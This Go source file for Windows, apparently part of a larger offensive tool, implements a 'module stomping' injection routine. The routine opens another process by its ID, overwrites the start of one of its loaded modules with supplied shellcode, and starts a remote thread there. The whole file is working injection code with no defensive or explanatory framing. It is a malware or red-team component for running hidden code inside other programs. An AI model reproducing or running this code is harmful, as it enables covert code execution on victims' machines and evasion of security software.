//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	procModule32FirstW = k32.NewProc("Module32FirstW")
	procModule32NextW  = k32.NewProc("Module32NextW")
)

type moduleEntry32 struct {
	dwSize        uint32
	th32ModuleID  uint32
	th32ProcessID uint32
	glblcntUsage  uint32
	proccntUsage  uint32
	modBaseAddr   *uint8
	modBaseSize   uint32
	hModule       uintptr
	szModule      [256]uint16
	szExePath     [260]uint16
}

func moduleStompInject(pid uint32, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	da := uint32(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
	hProc, _, _ := procOpenProcess.Call(uintptr(da), 0, uintptr(pid))
	if hProc == 0 {
		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	}
	if hProc == 0 {
		return fmt.Errorf("OpenProcess(%d) failed", pid)
	}
	defer procCloseHandle.Call(hProc)

	snap, _, _ := procCreateToolhelp32Snapshot.Call(0x00000008, uintptr(pid))
	if snap == 0 {
		return fmt.Errorf("CreateToolhelp32Snapshot (module) failed")
	}
	defer procCloseHandle.Call(snap)

	var me moduleEntry32
	me.dwSize = uint32(unsafe.Sizeof(me))
	ret, _, _ := procModule32FirstW.Call(snap, uintptr(unsafe.Pointer(&me)))
	if ret == 0 {
		return fmt.Errorf("no modules found")
	}

	var targetAddr uintptr

	for ret != 0 {
		if me.modBaseAddr != nil && me.modBaseSize >= uint32(len(shellcode)) {
			modName := syscall.UTF16ToString(me.szModule[:])
			_ = modName
			targetAddr = uintptr(unsafe.Pointer(me.modBaseAddr))
			break
		}
		ret, _, _ = procModule32NextW.Call(snap, uintptr(unsafe.Pointer(&me)))
	}

	if targetAddr == 0 {
		return fmt.Errorf("no suitable module found (need %d bytes)", len(shellcode))
	}

	var oldProtect uint32
	r1, _, _ := procVirtualProtectEx.Call(
		hProc, targetAddr,
		uintptr(len(shellcode)),
		uintptr(PAGE_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r1 == 0 {
		return fmt.Errorf("VirtualProtectEx RW failed")
	}

	var written uintptr
	r2, _, _ := procWriteProcessMemory.Call(
		hProc, targetAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r2 == 0 {
		procVirtualProtectEx.Call(hProc, targetAddr, uintptr(len(shellcode)), uintptr(oldProtect), 0)
		return fmt.Errorf("WriteProcessMemory failed")
	}

	// Restore the original (RX) protection BEFORE spawning the thread so the
	// stomped module section is never left RWX.
	procVirtualProtectEx.Call(hProc, targetAddr, uintptr(len(shellcode)), uintptr(oldProtect), 0)

	thread, _, _ := procCreateRemoteThread.Call(
		hProc, 0, 0,
		targetAddr, 0, 0, 0,
	)
	if thread == 0 {
		return fmt.Errorf("CreateRemoteThread failed")
	}
	procCloseHandle.Call(thread)

	return nil
}
